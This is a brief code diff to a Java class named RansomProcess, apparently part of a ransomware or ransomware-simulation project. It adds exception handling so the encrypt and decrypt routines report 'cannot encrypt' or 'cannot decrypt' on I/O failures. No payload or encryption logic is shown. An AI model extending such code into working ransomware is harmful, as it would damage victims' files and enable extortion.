@@ -3,6 +3,8 @@ import com.fasterxml.jackson.databind.ObjectMapper;
 
 import javax.crypto.spec.SecretKeySpec;
 import java.io.File;
+import java.io.UncheckedIOException;
+import java.nio.file.AccessDeniedException;
 import java.security.GeneralSecurityException;
 import java.security.NoSuchAlgorithmException;
 import java.sql.SQLException;
@@ -63,6 +65,8 @@ public class RansomProcess {
             System.out.println("SqlException Caught");
         } catch (GeneralSecurityException e) {
             System.out.println("Cipher Error");
+        } catch (UncheckedIOException e) {
+            System.out.println("cannot encrypt");
         }
 
     }
@@ -108,6 +112,8 @@ public class RansomProcess {
             e.printStackTrace();
         } catch (NullPointerException e) {
             System.out.println("Map not Exists Encrypt First");
+        } catch (UncheckedIOException e) {
+            System.out.println("cannot decrypt");
         } finally {
             EmbeddedDatabase.DropTable();
         }
